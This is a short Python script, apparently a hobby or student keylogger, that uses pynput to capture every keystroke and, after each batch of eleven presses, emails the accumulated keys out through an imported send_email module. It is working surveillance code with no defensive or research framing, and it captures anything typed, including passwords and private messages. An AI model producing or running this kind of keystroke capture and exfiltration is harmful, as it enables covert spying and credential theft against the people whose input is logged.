import pynput
from pynput.keyboard import Key, Listener
import send_email
import key
import NSFW
import info

count = 0
keys = []

#To save and update keylogger.txt
def write_1(data):
    with open('keylogger.txt', 'a') as f:
        f.write(data + '\n')
        
def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

